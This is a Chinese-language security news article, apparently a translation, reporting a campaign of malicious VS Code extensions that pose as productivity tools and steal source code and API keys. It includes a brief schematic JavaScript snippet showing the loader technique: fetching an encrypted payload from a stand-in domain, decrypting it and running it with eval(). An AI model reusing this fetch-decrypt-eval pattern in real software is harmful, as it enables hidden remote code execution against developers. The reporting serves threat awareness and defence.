---
title: 紧急警报！ 恶意 VS Code 扩展程序伪装升级，开发者面临巨大风险
url: https://www.anquanke.com/post/id/306315
source: 安全客-有思想的安全新媒体
date: 2025-04-10
fetch_date: 2025-10-06T22:04:00.281959
---

# 紧急警报！ 恶意 VS Code 扩展程序伪装升级，开发者面临巨大风险

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 紧急警报！ 恶意 VS Code 扩展程序伪装升级，开发者面临巨大风险

阅读量**57356**

发布时间 : 2025-04-09 14:23:33

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/beware-of-malicious-vs-code-extension-apps/>

译文仅供参考，具体内容表达以及含义原文为准。

网络安全研究人员发现了一场令人不安的攻击活动，该活动通过恶意的 Visual Studio Code 扩展程序来针对软件开发人员，这些恶意扩展程序累计已被安装了数百万次。

这些被篡改的扩展程序伪装成合法的提高工作效率的工具，在开发人员专注于编程任务时，秘密地执行恶意代码。

这些扩展程序在隐藏其真实目的的同时，看起来功能完备，由于它们在行业内最受信任的开发环境之一中运行，因此格外危险。

这场恶意软件攻击活动主要针对的是 JavaScript 和 Python 开发人员，这些扩展程序声称具备代码格式化、代码片段生成以及自动化功能等特性。

一旦安装，这些扩展程序就能访问本地文件，有可能窃取存储在开发环境中的源代码、应用程序编程接口（API）密钥以及其他敏感信息。

安全专家警告称，这些扩展程序有可能在软件开发过程中为软件创建后门，从而在生产系统中引入漏洞。

ExtensionTotal 的分析师兼研究员 Yuval Ronen 指出，这次攻击的复杂性表明，背后是有组织的威胁行为者，而不是机会主义的黑客。

Ronen 在分析了几个恶意扩展程序后解释道：“这些扩展程序不仅仅是在窃取凭据；它们被设计为能够保持持续存在，并有可能引入一些细微的漏洞，这些漏洞日后可能会被用于攻击已部署的应用程序。”

这次攻击利用了 Visual Studio Code 强大的扩展生态系统，该生态系统允许开发人员使用数千个由社区创建的工具来自定义他们的开发环境。

尽管 Microsoft 实施了安全措施，但扩展程序数量众多，给全面审查带来了挑战。

许多恶意扩展程序最初进入市场时代码是干净的，只是后来通过更新引入了恶意功能。

### ****感染机制揭示了先进的技术手段****

主要的感染机制采用了多阶段的方法来逃避检测。

最初，扩展程序在加载合法功能的同时，会下载一个伪装成配置数据的加密有效载荷。

然后，这个有效载荷会使用 JavaScript 的 eval () 函数进行解密和执行：

const decrypt = (data, key) => {

// 解密逻辑

return decryptedPayload;};

const config = await fetch(‘https://legitimate-looking-domain.com/config.json’);const payload = decrypt(config.data, process.env.SOME\_ENV\_VAR);eval(payload); // 执行恶意代码

这种技术使得恶意软件能够绕过静态代码分析工具，因为恶意代码从未直接出现在扩展程序的源代码中。

这些扩展程序在部署其有效载荷之前，还会检查调试环境和安全工具，显示出了复杂的反分析能力。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/beware-of-malicious-vs-code-extension-apps/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306315](/post/id/306315)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/beware-of-malicious-vs-code-extension-apps/)

如若转载,请注明出处： <https://cybersecuritynews.com/beware-of-malicious-vs-code-extension-apps/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**5赞

收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p5.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)